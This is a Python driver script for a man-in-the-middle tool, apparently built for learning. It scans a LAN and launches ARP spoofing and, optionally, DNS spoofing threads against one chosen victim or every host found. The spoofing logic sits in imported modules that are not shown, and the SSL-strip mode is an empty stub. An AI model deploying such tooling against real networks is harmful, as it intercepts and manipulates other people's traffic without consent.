#!/usr/bin/env python3

import argparse
import sys
import time
import threading
from typing import List, Optional
from modules.arp_spoof import ARPSpoofer
from modules.dns_spoof import DNSSpoofer
from modules.ssl_strip import SSLStripper
from modules.network_discovery import NetworkScanner
import os

class MITMTool:
    def __init__(self, interface: str, gateway: str, attack_type: str, manual_mode: bool = False):
        self.interface = interface
        self.gateway = gateway
        self.attack_type = attack_type
        self.manual_mode = manual_mode
        self.threads: List[threading.Thread] = []
        self.spoofers: List[ARPSpoofer | DNSSpoofer] = []

    def setup_targets(self) -> List[str]:
        """Setup target IPs based on mode selection."""
        scanner = NetworkScanner(self.gateway, self.interface)
        scanner.start()
        
        if self.manual_mode:
            return [scanner.victim_list[int(input(f'Pick a target IP (from 1 to {len(scanner.victim_list) - 1}): '))][0]]
        return scanner.victim_list

    def create_spoofer(self, target: str) -> None:
        """Create and start appropriate spoofer based on attack type."""
        if target == self.gateway:
            return

        # ARP spoofing is always performed as it's the foundation
        arp_spoofer = ARPSpoofer(self.interface, target, self.gateway)
        self.spoofers.append(arp_spoofer)
        self._start_thread(arp_spoofer.start)

        if self.attack_type == 'dns':
            dns_spoofer = DNSSpoofer(self.interface, target, self.gateway)
            self.spoofers.append(dns_spoofer)
            # Create a daemon thread for DNS spoofing
            dns_thread = threading.Thread(target=dns_spoofer.start, daemon=True)
            self.threads.append(dns_thread)
            dns_thread.start()

        if self.attack_type == 'ssl':
            pass

    def _start_thread(self, target_func) -> None:
        """Helper method to create and start a thread."""
        thread = threading.Thread(target=target_func)
        self.threads.append(thread)
        thread.start()

    def cleanup(self) -> None:
        """Cleanup resources and stop all spoofers."""
        print("\n[*] Shutting down all spoofers...")
        for spoofer in self.spoofers:
            print(f"[*] Stopping {type(spoofer).__name__}...")
            spoofer.stop()
        for thread in self.threads:
            print(f"[*] Joining thread {thread.name}...")
            thread.join()
            print(f"[*] Thread {thread.name} joined")
        print("\n[*] Shutting down MITM tool...")

    def run(self) -> None:
        """Main execution method."""
        targets = self.setup_targets()
        for target in targets:
            self.create_spoofer(target)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.cleanup()
            sys.exit(0)

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='MITM Tool for Educational Purposes')
    parser.add_argument('-m', '--mode', action='store_true',
                      help='Manual mode: select target instead of scanning all hosts')
    parser.add_argument('-i', '--interface', required=True, help='Network interface to use')
    parser.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
    parser.add_argument('-t', '--type', choices=['arp', 'dns', 'ssl'], 
                      default='arp', help='Attack type to use')
    return parser.parse_args()

def main() -> None:
    args = parse_arguments()
    tool = MITMTool(
        interface=args.interface,
        gateway=args.gateway,
        attack_type=args.type,
        manual_mode=args.mode
    )
    tool.run()

if __name__ == "__main__":
    main()